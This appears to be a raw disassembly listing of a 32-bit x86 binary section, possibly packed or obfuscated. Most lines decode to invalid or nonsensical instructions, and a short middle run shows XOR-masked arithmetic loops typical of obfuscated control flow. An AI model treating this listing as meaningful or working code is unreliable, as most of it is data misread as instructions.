  41ec3c:	and    BYTE PTR [ebp-0x486d4dc4],0x29
  41ec43:	nop
  41ec44:	cld    
  41ec45:	mov    WORD PTR [ecx-0x5],fs
  41ec48:	ja     0x41ec08
  41ec4a:	and    BYTE PTR [eax],0xe
  41ec4d:	jmp    0xd708:0xccc40ada
  41ec54:	aaa    
  41ec55:	icebp  
  41ec56:	aas    
  41ec57:	mov    esi,0xbbf4a36f
  41ec5c:	jbe    0x41ecd2
  41ec5e:	xor    dl,al
  41ec60:	push   ebp
  41ec61:	das    
  41ec62:	imul   edx,ecx,0xffffffec
  41ec65:	cld    
  41ec66:	ja     0x41ece2
  41ec68:	push   0xf34310c4
  41ec6d:	xchg   edx,eax
  41ec6e:	test   al,0x18
  41ec70:	mov    ds:0x133ce209,eax
  41ec75:	push   ecx
  41ec76:	call   0x59d918a2
  41ec7b:	inc    edi
  41ec7c:	pop    ebx
  41ec7d:	sub    DWORD PTR [edi+0x33cf3208],edx
  41ec83:	cli    
  41ec84:	into   
  41ec85:	cmp    al,0xf
  41ec87:	inc    edx
  41ec88:	retf   
  41ec89:	and    BYTE PTR [edi+0x56],cl
  41ec8c:	inc    eax
  41ec8d:	fcmovnu st,st(0)
  41ec8f:	or     BYTE PTR [ebx+ecx*1],al
  41ec92:	jl     0x41ecf8
  41ec94:	loop   0x41ed0b
  41ec96:	cmp    bl,ah
  41ec98:	(bad)  
  41ec99:	dec    esi
  41ec9a:	xor    BYTE PTR [ebx+0x328c2f93],0x31
  41eca1:	loop   0x41ec82
  41eca3:	ss inc esp
  41eca5:	xor    ebx,DWORD PTR [ebx+esi*8-0x4f]
  41eca9:	inc    esi
  41ecaa:	in     al,0x6e
  41ecac:	fdivr  DWORD PTR [eax-0x26]
  41ecaf:	pop    esi
  41ecb0:	and    DWORD PTR [eax],esp
  41ecb2:	inc    ebp
  41ecb3:	das    
  41ecb4:	fidivr WORD PTR [edx+0x42]
  41ecb7:	mov    esi,0x4d8cd554
  41ecbc:	test   ecx,eax
  41ecbe:	cmp    al,0xa1
  41ecc0:	mov    edi,0x9ae0356
  41ecc5:	pop    ds
  41ecc6:	in     eax,dx
  41ecc7:	js     0x41ed44
  41ecc9:	stos   DWORD PTR es:[edi],eax
  41ecca:	xchg   edx,eax
  41eccb:	sub    al,0x9
  41eccd:	call   0x909a:0x6c9cb999
  41ecd4:	add    DWORD PTR [eax-0x5b9f9b04],esi
  41ecda:	push   eax
  41ecdb:	pop    ecx
  41ecdc:	cmp    edi,ecx
  41ecde:	cdq    
  41ecdf:	lods   eax,DWORD PTR ds:[esi]
  41ece0:	or     al,0xf8
  41ece2:	mov    ch,0xbc
  41ece4:	pop    es
  41ece5:	int    0x17
  41ece7:	push   edx
  41ece8:	or     dh,BYTE PTR [ebx+0x7e]
  41eceb:	adc    eax,esp
  41eced:	add    eax,0x9086e06c
  41ecf2:	dec    esi
  41ecf3:	out    0xa8,eax
  41ecf5:	fwait
  41ecf6:	and    BYTE PTR [esi-0x4b38b136],dl
  41ecfc:	(bad)  
  41ecfd:	outs   dx,DWORD PTR ds:[esi]
  41ecfe:	mov    esp,0x4ad33c86
  41ed03:	sbb    DWORD PTR [edi],edi
  41ed05:	clc    
  41ed06:	sub    esi,edx
  41ed08:	into   
  41ed09:	fcomip st,st(5)
  41ed0b:	popa   
  41ed0c:	imul   ebp,DWORD PTR [edi+0x64ebd9b],0xd
  41ed13:	inc    esp
  41ed14:	lods   eax,DWORD PTR ds:[esi]
  41ed15:	mov    al,ds:0xe42aa61b
  41ed1a:	pop    esi
  41ed1b:	mov    ebx,0xfe91c7fc
  41ed20:	jecxz  0x41ed9e
  41ed22:	push   cs
  41ed23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed24:	sub    DWORD PTR [ebx-0x673cc365],0x273cac0b
  41ed2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed2f:	add    ch,al
  41ed31:	mov    bl,0x4b
  41ed33:	repz adc DWORD PTR [ebx+0x14],0x71
  41ed38:	ss ja  0x41ecf1
  41ed3b:	test   al,0x6c
  41ed3d:	aad    0xe0
  41ed3f:	dec    esi
  41ed40:	xor    DWORD PTR [edx+ebx*2],ebp
  41ed43:	int    0xdf
  41ed45:	pop    ebp
  41ed46:	int3   
  41ed47:	std    
  41ed48:	mov    esi,0x51a75aab
  41ed4d:	pop    edx
  41ed4e:	pop    eax
  41ed4f:	or     BYTE PTR [ecx],bh
  41ed51:	je     0x41ed90
  41ed53:	ret    0x597
  41ed56:	or     BYTE PTR [bx+di-0xb],ah
  41ed5a:	inc    esi
  41ed5b:	jmp    0xc7b2:0x9a1cee5c
  41ed62:	and    al,0xb8
  41ed64:	mov    ds:0x2ee40da3,al
  41ed69:	inc    ecx
  41ed6a:	jb     0x41edc9
  41ed6c:	sbb    ch,BYTE PTR [esi]
  41ed6e:	(bad)  
  41ed70:	jl     0x41ed82
  41ed72:	push   es
  41ed73:	add    eax,0xd9351a9a
  41ed78:	xor    ebx,DWORD PTR [edx+0x53]
  41ed7b:	les    esi,FWORD PTR [ebp+0x2f]
  41ed7e:	sbb    eax,0xe16175c5
  41ed83:	aaa    
  41ed84:	push   ebp
  41ed85:	shl    DWORD PTR [esi-0x32ce5e47],1
  41ed8b:	sub    DWORD PTR [edi],edi
  41ed8d:	push   cs
  41ed8e:	scas   al,BYTE PTR es:[edi]
  41ed8f:	out    0x33,eax
  41ed91:	(bad)  
  41ed92:	fild   DWORD PTR [edi]
  41ed94:	or     eax,DWORD PTR [edi+0x2d]
  41ed97:	daa    
  41ed98:	stos   BYTE PTR es:[edi],al
  41ed99:	pop    edx
  41ed9a:	push   ebp
  41ed9b:	push   ss
  41ed9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed9d:	fidiv  DWORD PTR [eax]
  41ed9f:	jo     0x41ed42
  41eda1:	pushf  
  41eda2:	stc    
  41eda3:	pop    ebp
  41eda4:	add    DWORD PTR [ebx-0x10],ebp
  41eda7:	xchg   edi,eax
  41eda8:	push   edi
  41eda9:	rol    BYTE PTR [eax],cl
  41edab:	add    DWORD PTR [ebp+ecx*4+0x3876b2f7],edi
  41edb2:	pop    ss
  41edb3:	jg     0x41ed70
  41edb5:	pop    ebx
  41edb6:	test   DWORD PTR [ecx+0x4f9f8cba],0x3c921e6e
  41edc0:	and    DWORD PTR [ecx],0xf7abe678
  41edc6:	adc    dl,BYTE PTR [ebx]
  41edc8:	push   ebx
  41edc9:	mov    bh,0x2
  41edcb:	xchg   edx,eax
  41edcc:	clc    
  41edcd:	outs   dx,BYTE PTR ds:[esi]
  41edce:	pushf  
  41edcf:	adc    BYTE PTR [eax-0x18],dl
  41edd2:	(bad)  
  41edd3:	sbb    DWORD PTR [ebx+0x1b],esi
  41edd6:	sbb    al,0x55
  41edd8:	cmp    al,0x8c
  41edda:	in     al,0x53
  41eddc:	sub    DWORD PTR [ebp+0xf],ecx
  41eddf:	mov    ds:0xb5aba04c,eax
  41ede4:	mov    BYTE PTR [edi],ch
  41ede6:	fiadd  WORD PTR [ebp-0x13b0c6be]
  41edec:	cmp    ecx,DWORD PTR [ebx]
  41edee:	in     al,dx
  41edef:	ins    DWORD PTR es:[edi],dx
  41edf0:	xchg   DWORD PTR [ebp+0x3eff3234],ecx
  41edf6:	cmp    ecx,edi
  41edf8:	ja     0x41edd4
  41edfa:	mov    esi,0xf77ebb61
  41edff:	imul   ebp,ebx,0x49
  41ee02:	inc    esp
  41ee03:	xchg   edx,eax
  41ee04:	add    DWORD PTR [edi-0x2728b902],esi
  41ee0a:	xor    bl,BYTE PTR [eax+0x51]
  41ee0d:	cs scas al,BYTE PTR es:[edi]
  41ee0f:	inc    esp
  41ee10:	cmp    ecx,DWORD PTR [esi+esi*2+0x72]
  41ee14:	fistp  WORD PTR [edx+0x4b053ad9]
  41ee1a:	adc    eax,edi
  41ee1c:	loope  0x41edbc
  41ee1e:	loope  0x41eda9
  41ee20:	ins    BYTE PTR es:[edi],dx
  41ee21:	popa   
  41ee22:	inc    edx
  41ee23:	sbb    eax,0x95de0e0
  41ee28:	inc    esp
  41ee29:	and    esp,DWORD PTR [esi-0x6e]
  41ee2c:	jge    0x41edba
  41ee2e:	jmp    0x6025:0x8fcfc723
  41ee35:	inc    eax
  41ee36:	dec    ebp
  41ee37:	sbb    ch,BYTE PTR [edi-0x46]
  41ee3a:	sub    BYTE PTR [eax],dl
  41ee3c:	xchg   ecx,eax
  41ee3d:	fld    TBYTE PTR [ebp-0x11e89217]
  41ee43:	xchg   edx,esp
  41ee45:	add    ch,BYTE PTR [edx-0x5c]
  41ee48:	mov    ch,BYTE PTR [esi+0x25f23b1e]
  41ee4e:	mov    eax,0xb06c3874
  41ee53:	mov    ch,0x13
  41ee55:	push   eax
  41ee56:	fistp  WORD PTR [esi+0x62]
  41ee59:	call   0xad4c3c68
  41ee5e:	xlat   BYTE PTR ds:[ebx]
  41ee5f:	or     eax,0xb327c989
  41ee64:	mov    ds:0xeda6f9ee,al
  41ee69:	in     eax,0xe4
  41ee6b:	lea    esp,[eax+0x254b5bef]
  41ee71:	or     BYTE PTR [ecx],0xe3
  41ee74:	leave  
  41ee75:	xor    al,0x28
  41ee77:	fcomp  DWORD PTR [ecx+0xe]
  41ee7a:	lahf   
  41ee7b:	push   edx
  41ee7c:	sub    BYTE PTR [ecx+0x38],al
  41ee7f:	leave  
  41ee80:	mov    esi,0xe88d0044
  41ee85:	imul   ebp,DWORD PTR [edx],0x3
  41ee88:	test   al,0xcd
  41ee8a:	test   DWORD PTR [ecx-0x71],eax
  41ee8d:	add    eax,0x340dd41b
  41ee92:	test   ecx,eax
  41ee94:	das    
  41ee95:	cmp    dl,BYTE PTR [ebx-0x42aeb128]
  41ee9b:	pop    eax
  41ee9c:	or     eax,edx
  41ee9e:	in     eax,dx
  41ee9f:	fiadd  WORD PTR [ecx+0x52]
  41eea2:	push   0x88855fd4
  41eea7:	ja     0x41ee6d
  41eea9:	fstp   QWORD PTR [ebx-0x56]
  41eeac:	push   ecx
  41eead:	fwait
  41eeae:	(bad)  
  41eeaf:	push   DWORD PTR [ebp+esi*8+0x7]
  41eeb3:	and    bh,cl
  41eeb5:	mov    dh,0xd4
  41eeb7:	mov    ds:0x16f08642,eax
  41eebc:	cwde   
  41eebd:	jae    0x41eef9
  41eebf:	mov    edx,0x78aed95
  41eec4:	cmp    al,0x27
  41eec6:	mov    esp,0x8753ccb3
  41eecb:	sbb    eax,0xe4d16a9e
  41eed0:	fdivr  QWORD PTR [ecx]
  41eed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eed3:	mov    eax,ds:0x8408f51e
  41eed8:	push   0x6f
  41eeda:	scas   eax,DWORD PTR es:[edi]
  41eedb:	aam    0x10
  41eedd:	mov    eax,0xb4ce127d
  41eee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee3:	call   0x413e:0xdfcea37e
  41eeea:	add    BYTE PTR [ecx],bh
  41eeec:	lock add DWORD PTR [edx],esi
  41eeef:	cli    
  41eef0:	add    ah,BYTE PTR [edx-0x545f5d89]
  41eef6:	sbb    DWORD PTR [edx],ebx
  41eef8:	(bad)  
  41eef9:	pop    ds
  41eefa:	mov    BYTE PTR [ebp+0x50299fd8],bh
  41ef00:	mov    ch,0xbe
  41ef02:	retf   0x2e29
  41ef05:	xchg   esi,eax
  41ef06:	shr    DWORD PTR [eax+0x7454697f],0x6b
  41ef0d:	pop    ecx
  41ef0e:	rol    DWORD PTR ds:0x9ce7e7c3,1
  41ef14:	inc    eax
  41ef15:	lea    eax,[eax+0x7f670710]
  41ef1b:	(bad)  
  41ef1c:	leave  
  41ef1d:	sbb    esp,DWORD PTR [ebx+0x41622d8e]
  41ef23:	pop    ecx
  41ef24:	jmp    0x5b815bf2
  41ef29:	sbb    esi,DWORD PTR [ecx+0xd0ea183]
  41ef2f:	inc    edi
  41ef30:	scas   eax,DWORD PTR es:[edi]
  41ef31:	retf   
  41ef32:	jnp    0x41ef44
  41ef34:	adc    esp,DWORD PTR [edx-0x2b]
  41ef37:	iret   
  41ef38:	repnz aas 
  41ef3a:	jnp    0x41efb2
  41ef3c:	push   eax
  41ef3d:	in     eax,0xe5
  41ef3f:	dec    esp
  41ef40:	int    0x50
  41ef42:	xchg   BYTE PTR [eax+0x2228f86],ah
  41ef48:	shr    BYTE PTR [ecx],cl
  41ef4a:	fwait
  41ef4b:	(bad)  
  41ef4c:	mov    edx,0x6efa11aa
  41ef51:	lods   eax,DWORD PTR ds:[esi]
  41ef52:	mov    BYTE PTR ds:0x7e741707,cl
  41ef58:	pop    ecx
  41ef59:	out    dx,eax
  41ef5a:	je     0x41ef75
  41ef5c:	gs sbb eax,0x65903c0f
  41ef62:	adc    ebx,DWORD PTR [esi+0x55]
  41ef65:	adc    eax,0x461c6e1f
  41ef6a:	jl     0x41efbe
  41ef6c:	int3   
  41ef6d:	inc    edi
  41ef6e:	arpl   WORD PTR gs:[esi],dx
  41ef71:	adc    eax,0x3e912f73
  41ef76:	loopne 0x41efd2
  41ef78:	push   esp
  41ef79:	sub    BYTE PTR [eax-0x2a],al
  41ef7c:	mov    edx,0x91d3203a
  41ef81:	rcl    BYTE PTR [edx-0x586d94d8],0x58
  41ef88:	loopne 0x41efd5
  41ef8a:	push   cs
  41ef8b:	inc    ebx
  41ef8c:	lahf   
  41ef8d:	dec    esi
  41ef8e:	aad    0xfd
  41ef90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef91:	sub    ch,BYTE PTR [eax+ecx*2]
  41ef94:	xlat   BYTE PTR ds:[ebx]
  41ef95:	dec    ecx
  41ef96:	imul   DWORD PTR [ebx+0x1b15cd3c]
  41ef9c:	sar    DWORD PTR [esi],cl
  41ef9e:	(bad)  
  41ef9f:	xor    esi,DWORD PTR [esi+0x7082ce09]
  41efa5:	cld    
  41efa6:	xor    cl,BYTE PTR [esi-0x9]
  41efa9:	fisttp DWORD PTR ds:0xf13f4c17
  41efaf:	xchg   BYTE PTR [esi-0x8c539b4],ah
  41efb5:	nop
  41efb6:	add    bh,cl
  41efb8:	call   0x2273d01f
  41efbd:	jl     0x41efce
  41efbf:	or     al,0x6b
  41efc1:	cmp    dh,BYTE PTR [ebx+edi*2+0x3e7cc4df]
  41efc8:	out    0x87,eax
  41efca:	push   edx
  41efcb:	(bad)  
  41efcc:	adc    DWORD PTR [edi-0x246daa4f],eax
  41efd2:	dec    BYTE PTR [edx]
  41efd4:	mov    edx,0x8747b271
  41efd9:	pop    ebp
  41efda:	test   ebx,edi
  41efdc:	xchg   DWORD PTR [edx],eax
  41efde:	retf   
  41efdf:	jnp    0x41ef92
  41efe1:	int    0xaa
  41efe3:	xor    bh,BYTE PTR [ebp-0x39]
  41efe6:	sbb    dh,BYTE PTR [esi+0x2]
  41efe9:	pop    es
  41efea:	dec    BYTE PTR [eax]
  41efec:	mov    al,0x5f
  41efee:	jmp    0x7e0bf320
  41eff3:	sbb    dl,BYTE PTR [esi]
  41eff5:	test   DWORD PTR [eax+0x3],esp
  41eff8:	pushf  
  41eff9:	shl    DWORD PTR [eax],cl
  41effb:	cmp    dl,dh
  41effd:	mov    cl,0x33
  41efff:	enter  0xce03,0xf
  41f003:	test   DWORD PTR [ebx-0x24],esp
  41f006:	(bad)  
  41f007:	dec    DWORD PTR [ebx+0x4d89f44d]
  41f00d:	or     cl,ch
  41f00f:	sub    eax,0x8b000000
  41f014:	dec    ebp
  41f015:	or     BYTE PTR [ebx-0x37cc07ab],cl
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x3ea26403
  41f0bf:	cmp    esp,DWORD PTR [edx+0x51]
  41f0c2:	fsub   DWORD PTR [ecx+0x62]
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx-0x52]
  41f0ca:	sub    dh,BYTE PTR [esi+edx*2]
  41f0cd:	daa    
  41f0ce:	cmp    al,0x96
  41f0d0:	or     DWORD PTR [ebp+0x78],eax
  41f0d3:	lods   eax,DWORD PTR ds:[esi]
  41f0d4:	inc    edi
  41f0d5:	push   es
  41f0d6:	xor    ch,bl
  41f0d8:	pop    edi
  41f0d9:	sahf   
  41f0da:	cmp    DWORD PTR [ecx+0x45],esp
  41f0dd:	out    dx,eax
  41f0de:	adc    ecx,ebp
  41f0e0:	ja     0x41f0a8
  41f0e2:	mov    BYTE PTR [esi-0x59],0xfb
  41f0e6:	cli    
  41f0e7:	fsubp  st(3),st
  41f0e9:	pop    ebp
  41f0ea:	int    0xc2
  41f0ec:	test   eax,0xf060287
  41f0f1:	imul   eax,edx,0x4c
  41f0f4:	or     DWORD PTR [edx],esi
  41f0f6:	aad    0x20
  41f0f8:	lock fild QWORD PTR [ecx+0x1b]
  41f0fc:	xchg   edx,eax
  41f0fd:	out    dx,eax
  41f0fe:	sti    
  41f0ff:	or     al,0xf9
  41f101:	aam    0x90
  41f103:	xor    eax,0xedc6cc49
  41f108:	jns    0x41f0e5
  41f10a:	inc    ebx
  41f10b:	ror    BYTE PTR [edx],1
  41f10d:	je     0x41f0e9
  41f10f:	inc    edi
  41f110:	and    BYTE PTR [edx-0x58a529fd],dl
  41f116:	retf   
  41f117:	push   cs
  41f118:	fwait
  41f119:	adc    eax,0x4a21905b
  41f11e:	adc    ebp,ebx
  41f120:	in     al,dx
  41f121:	mov    eax,DWORD PTR [eax+0x5f]
  41f124:	or     edx,ebx
  41f126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f127:	dec    edx
  41f128:	inc    edi
  41f129:	and    al,BYTE PTR [eax-0x77]
  41f12c:	mov    ebp,0x899f2f2c
  41f131:	mov    ebp,0x10fa97b6
  41f136:	push   ecx
  41f137:	cli    
  41f138:	and    BYTE PTR [ebp-0x25],al
  41f13b:	and    eax,0xd4076f7d
  41f140:	mov    eax,0xbd784538
  41f145:	div    ebp
  41f147:	sbb    DWORD PTR [edx],0x58
  41f14a:	hlt    
  41f14b:	jbe    0x41f0d8
  41f14d:	leave  
  41f14e:	xchg   edx,eax
  41f14f:	pop    es
  41f150:	push   ss
  41f151:	mov    al,0x5a
  41f153:	lods   al,BYTE PTR ds:[esi]
  41f154:	sub    esi,0x967956c8
  41f15a:	sbb    DWORD PTR [ebx],0xffffff83
  41f15d:	xor    bl,al
  41f15f:	mov    bh,0x26
  41f161:	xor    eax,0xc714383a
  41f166:	stos   BYTE PTR es:[edi],al
  41f167:	sbb    ebx,DWORD PTR [edi+ebx*2+0x71]
  41f16b:	xor    al,0x8
  41f16d:	sbb    eax,0x824fe08d
  41f172:	ret    0xfa55
  41f175:	dec    eax
  41f176:	xor    ah,bh
  41f178:	loopne 0x41f144
  41f17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f17b:	addr16 call 0x1646:0xd5afbba0
  41f183:	pop    es
  41f184:	lds    ecx,FWORD PTR [edx+0x70]
  41f187:	push   es
  41f188:	xchg   esi,eax
  41f189:	in     al,dx
  41f18a:	je     0x41f1aa
  41f18c:	fild   WORD PTR [ecx]
  41f18e:	cmp    DWORD PTR [edx],0xffffff94
  41f191:	imul   edx,DWORD PTR [ebx],0xffffffd3
  41f194:	xor    eax,0x921b5af
  41f199:	mov    esi,0x6801565b
  41f19e:	pop    ds
  41f19f:	dec    ecx
  41f1a0:	and    esi,DWORD PTR [ebp-0x47cc4769]
  41f1a6:	sbb    eax,0x7816fd7c
  41f1ab:	or     esp,ebx
  41f1ad:	es out 0x88,eax
  41f1b0:	sbb    eax,0x9a7ce236
  41f1b5:	out    dx,eax
  41f1b6:	test   DWORD PTR [ebp-0x7c4e4169],edi
  41f1bc:	push   cs
  41f1bd:	ret    
  41f1be:	mov    ebp,0x26e4b358
  41f1c3:	neg    DWORD PTR [edx+ebp*4]
  41f1c6:	das    
  41f1c7:	push   ecx
  41f1c8:	xchg   esi,ebx
  41f1ca:	fsub   DWORD PTR [edx+0x6f]
  41f1cd:	lock out dx,al
  41f1cf:	cmc    
  41f1d0:	lds    ebp,FWORD PTR fs:[ebx-0x42]
  41f1d4:	jmp    0xcc488fd7
  41f1d9:	out    dx,al
  41f1da:	cmp    ebx,DWORD PTR [ecx]
  41f1dc:	inc    esi
  41f1dd:	jbe    0x41f164
  41f1df:	pop    ebp
  41f1e0:	fldcw  WORD PTR [ebp+0x76fac7f9]
  41f1e6:	and    BYTE PTR [esi+0x41],ah
  41f1e9:	in     al,0xb8
  41f1eb:	test   al,0x2e
  41f1ed:	dec    edi
  41f1ee:	push   esp
  41f1ef:	or     edi,0x93fb6b8a
  41f1f5:	adc    eax,0x7794decc
  41f1fa:	cmp    BYTE PTR [esi],ch
  41f1fc:	pop    ecx
  41f1fd:	ficom  WORD PTR [edx-0x6e]
  41f200:	test   BYTE PTR [edx],dl
  41f202:	jne    0x41f1c9
  41f204:	out    dx,al
  41f205:	push   ecx
  41f206:	adc    eax,0xad9d86ce
  41f20b:	arpl   WORD PTR [edx-0x35],si
  41f20e:	mov    DWORD PTR [esi+eiz*4-0x2feb658d],ebp
  41f215:	sar    bl,cl
  41f217:	inc    ebx
  41f218:	sbb    eax,0xb4270f08
  41f21d:	mov    al,0xdf
  41f21f:	test   eax,0xea1b558b
  41f224:	hlt    
  41f225:	mov    ch,0xd7
  41f227:	push   0x66cdba42
  41f22c:	adc    ecx,edi
  41f22e:	ins    BYTE PTR es:[edi],dx
  41f22f:	bound  edi,QWORD PTR [esi+0x5231a9a0]
  41f235:	addr16 push ecx
  41f237:	inc    ebp
  41f238:	pop    edx
  41f239:	cmp    DWORD PTR [esi+0x476a3276],0x31
  41f240:	sbb    DWORD PTR [ecx+0x60b3b2d2],0xffffffe1
  41f247:	(bad)
  41f24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24c:	xchg   DWORD PTR [ecx-0x771c32d4],eax
  41f252:	outs   dx,DWORD PTR ds:[esi]
  41f253:	mov    ah,BYTE PTR [edx]
  41f255:	test   eax,0xf4c1cfc2
  41f25a:	inc    esi
  41f25b:	(bad)  
  41f25c:	push   ecx
  41f25d:	add    eax,0x9772e16f
  41f262:	iret   
  41f263:	call   0x3baf3846
  41f268:	mov    esi,0x95707324
  41f26d:	mov    al,0x3c
  41f26f:	test   al,0xd6
  41f271:	xchg   esi,eax
  41f272:	jmp    0x41f220
  41f274:	loopne 0x41f22a
  41f276:	cmp    BYTE PTR gs:[esi],al
  41f279:	inc    esi
  41f27a:	(bad)  
  41f27b:	leave  
  41f27c:	mov    ds:0x850e7e8c,al
  41f281:	pushf  
  41f282:	adc    BYTE PTR [ebp-0x2b3b52f2],cl
  41f288:	add    esp,esi
  41f28a:	dec    ecx
  41f28c:	out    0x5c,eax
  41f28e:	mov    BYTE PTR [eax-0x6de65901],0x82
  41f295:	ins    DWORD PTR es:[edi],dx
  41f296:	mov    eax,ds:0xf6a00c7a
  41f29b:	dec    ebp
  41f29c:	or     DWORD PTR gs:0xb1f76ad9,ebx
  41f2a3:	inc    eax
  41f2a4:	push   esi
  41f2a5:	loop   0x41f2ae
  41f2a7:	mov    edi,0xa559bc20
  41f2ac:	or     DWORD PTR [edi],edi
  41f2ae:	xchg   esi,eax
  41f2af:	add    DWORD PTR [edx-0x3f],0xea85378f
  41f2b6:	or     BYTE PTR [esi+eax*2],0x82
  41f2ba:	and    BYTE PTR [esi+eax*2-0x52],0xb1
  41f2bf:	push   esi
  41f2c0:	addr16 add ch,0xfa
  41f2c4:	xor    eax,0xc5cc3ea3
  41f2c9:	shl    BYTE PTR [edx+0x1ee27510],cl
  41f2cf:	arpl   WORD PTR [edx-0x35097348],ax
  41f2d5:	jns    0x41f301
  41f2d7:	xor    edx,ebx
  41f2d9:	retf   
  41f2da:	sub    ch,al
  41f2dc:	daa    
  41f2dd:	call   FWORD PTR [eax-0x3a8167cd]
  41f2e3:	outs   dx,DWORD PTR ds:[esi]
  41f2e4:	rol    esp,0xb1
  41f2e7:	bound  esp,QWORD PTR [di-0x50b2]
  41f2ec:	lahf   
  41f2ed:	or     ah,BYTE PTR [esi-0x36]
  41f2f0:	js     0x41f288
  41f2f2:	jl     0x41f2b8
  41f2f4:	add    dh,BYTE PTR [esi-0x7]
  41f2f7:	xchg   edx,eax
  41f2f8:	mov    ebx,0x28291c58
  41f2fd:	ss repnz push eax
  41f300:	mov    bh,0x21
  41f302:	xchg   DWORD PTR [eax-0xc],ebx
  41f305:	jo     0x41f2c3
  41f307:	sbb    BYTE PTR [edx],0xa2
  41f30a:	mov    ebx,0x5089e7d6
  41f30f:	adc    eax,0xa8307935
  41f314:	mov    ecx,0xf3b0bfae
  41f319:	dec    ebp
  41f31a:	add    DWORD PTR [eax+0x59],0x80ca3771
  41f321:	pop    ebp
  41f322:	pop    eax
  41f323:	push   edx
  41f324:	sub    eax,0x3f9247eb
  41f329:	popf   
  41f32a:	outs   dx,DWORD PTR ds:[esi]
  41f32b:	cmp    al,0xd3
  41f32d:	pop    ds
  41f32e:	(bad)  
  41f330:	mov    bh,0xcb
  41f332:	push   0xfffffffb
  41f334:	or     al,0xde
  41f336:	rcl    BYTE PTR [ecx],0x3e
  41f339:	add    al,0xc4
  41f33b:	call   0x589a:0x96c2f107
  41f342:	add    ch,dl
  41f344:	jbe    0x41f334
  41f346:	rcr    BYTE PTR [edx+0x794a942d],cl
  41f34c:	iret   
  41f34d:	out    dx,eax
  41f34e:	neg    DWORD PTR [edi-0x1a322743]
  41f354:	jb     0x41f384
  41f356:	pop    ds
  41f357:	push   esi
  41f358:	test   DWORD PTR ds:[edi-0x77],ebx
  41f35c:	or     eax,0x919b8bea
  41f361:	fwait
  41f362:	dec    edi
  41f363:	mov    gs,WORD PTR [ecx-0x42]
  41f366:	mov    cs,ebp
  41f368:	fdiv   QWORD PTR [edi+0x469b8cf5]
  41f36e:	cmp    ebx,DWORD PTR [ebx+0x73ebe636]
  41f374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f375:	aaa    
  41f376:	or     cl,BYTE PTR [ebp+0x47]
  41f379:	dec    esi
  41f37a:	push   edi
  41f37b:	add    ecx,DWORD PTR ds:0x30340215
  41f381:	inc    esi
  41f382:	cmp    ecx,ebx
  41f384:	test   edx,esi
  41f386:	lods   eax,DWORD PTR ds:[esi]
  41f387:	in     al,dx
  41f388:	cli    
  41f389:	mov    bl,0x40
  41f38b:	jge    0x41f31c
  41f38d:	scas   eax,DWORD PTR es:[edi]
  41f38e:	mov    dh,BYTE PTR [eax+eax*8]
  41f391:	icebp  
  41f392:	pop    edi
  41f393:	fbld   TBYTE PTR [esi]
  41f395:	pop    ecx
  41f396:	icebp  
  41f397:	push   esi
  41f398:	dec    ebx
  41f399:	push   ds
  41f39a:	mov    al,0xcb
  41f39c:	and    al,0xef
  41f39e:	mov    dl,0x67
  41f3a0:	jle    0x41f3f8
  41f3a2:	jno    0x41f329
  41f3a4:	ret    0x99b
  41f3a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3a9:	in     al,0x7c
  41f3ab:	pop    ebp
  41f3ac:	push   esp
  41f3ad:	add    ecx,DWORD PTR [ecx+0x11]
  41f3b0:	out    dx,al
  41f3b1:	repz dec eax
  41f3b3:	fcmovb st,st(2)
